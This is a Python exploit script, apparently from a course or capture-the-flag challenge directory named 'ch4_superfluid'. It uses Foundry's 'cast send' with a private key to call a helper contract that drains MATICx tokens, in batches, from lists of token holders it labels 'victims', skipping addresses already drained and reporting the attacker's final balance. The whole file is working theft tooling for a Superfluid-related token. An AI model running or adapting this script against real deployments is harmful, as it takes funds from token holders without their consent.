#!/usr/bin/env python3
"""Drain remaining MATICx holders from the second file in batches."""
import json
import subprocess
import os
import time

def get_env():
    env = {}
    with open("/Users/dldustn/Desktop/AssignmentC/.env") as f:
        for line in f:
            line = line.strip()
            if "=" in line and not line.startswith("#"):
                k, v = line.split("=", 1)
                env[k] = v.strip('"').strip("'")
    return env

def main():
    env = get_env()
    rpc = env["RPC_CH4_SUPERFLUID"]
    pk = env["PRIVATE_KEY"]
    pub = env["PUBLIC_ADDRESS"]
    helper = "0xdb7f3fde634458b3a1a7d1b8b5aab81376b7121f"
    maticx = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"

    with open("/Users/dldustn/Desktop/AssignmentC/challenges/ch4_superfluid/runs/maticx_remaining_5001_10000_after_1776528625.json") as f:
        d = json.load(f)

    # Already drained in first batches
    already_done = {
        "0x1eb3faa360bf1f093f5a18d21f21f13d769d044a",
        "0x1aec0e1e5f0227d5b8f8135055b49dae0df3a434",
        "0x147aa6b917cdf7988b8d0529ed162a2ca385d463",
        "0x213bc01f6151aa4793889d2e24278e534559885e",
        "0x8e9d73cf85af8c006591ff9df954130738039fc2",
        "0x598327cecf843b407f1b7d0e40432695f967badd",
        "0x2a1c5cdc0170f4e9195e598418953074c626479a",
        "0xd18adeaf03386f17c485573c22dcaa40d72795be",
        "0xb4d73564f2c8354ff447d029f56ac7fd25dada88",
        "0x0a608f679244c5c3dc4868f11f69803252b5d24f",
        "0x735b74e12e868e1f8ebb87c26afeb6c3f0844cef",
        "0x8a53ffec945c55298be4c133af4ee2e2a1accd3f",
        "0x0ad65afa08e18ae282088bbae83526d6f14554b5",
        "0x86cad7b97793be93f8085ac50380c7a4fad6f2f9",
        "0x115714f0ae4a288b53a27732f83c60e3e7659265",
        "0x0623033f3073530ddf12ebdb663225c095a659d8",
        "0xa743dfde1a72ec2423c81da3c6d98d4d650526ad",
        "0x2802907ab681298d35ce2eaf2415550137c40c8a",
        "0x66882680eb877e2bdb889504c9390f09b71a7870",
        "0x4a5810aa3a5f0cf00d2ea0a4f3deaadd3d0d87ae",
        "0x762c853fb653323fb46e27cb3cd631022b5b8343",
        "0x3c8d48a5bc4e50982653271eb1b9e254a4c55e33",
        "0xf6d8cd8eb13c9a20e76915b36118eb588c6423ac",
        "0xae9b836631b163ef58c5bff99e5ceba14e18e73b",
        "0x2221f8c237a52a15da88534a35ea3cef04ea3ee1",
        "0x0bf4cc3dd72c74e85b7d1e9b3ec0313018e535dd",
    }

    remaining = [h["addr"] for h in d["holders"] if h["addr"] not in already_done]
    print(f"Remaining holders: {len(remaining)}")

    # Process in batches of 10
    batch_size = 10
    min_balance = "5000000000000000000"  # 5 MATIC minimum
    total_drained = 0
    batch_num = 0

    for i in range(0, len(remaining), batch_size):
        batch = remaining[i:i+batch_size]
        victims = ",".join(batch)

        r = subprocess.run(
            ["cast", "send", helper,
             f"executeSameTokenBatchCheckedNonApp(address,address[],uint256)",
             maticx, f"[{victims}]", min_balance,
             "--private-key", pk, "--rpc-url", rpc,
             "--gas-limit", "15000000", "--json"],
            capture_output=True, text=True, timeout=120
        )

        batch_num += 1
        try:
            result = json.loads(r.stdout)
            status = result.get("status", "0x0")
            gas = int(result.get("gasUsed", "0x0"), 16)
            if status == "0x1":
                print(f"  Batch {batch_num} ({i}-{i+len(batch)}): OK, gas={gas}")
            else:
                print(f"  Batch {batch_num} ({i}-{i+len(batch)}): REVERTED, gas={gas}")
        except:
            print(f"  Batch {batch_num} ({i}-{i+len(batch)}): ERROR - {r.stderr[:100] if r.stderr else 'no output'}")

        # Stop if we've done 100 batches
        if batch_num >= 100:
            break

    # Final balance
    r = subprocess.run(["cast", "balance", pub, "--rpc-url", rpc], capture_output=True, text=True)
    print(f"\nFinal balance: {r.stdout.strip()}")

if __name__ == "__main__":
    main()
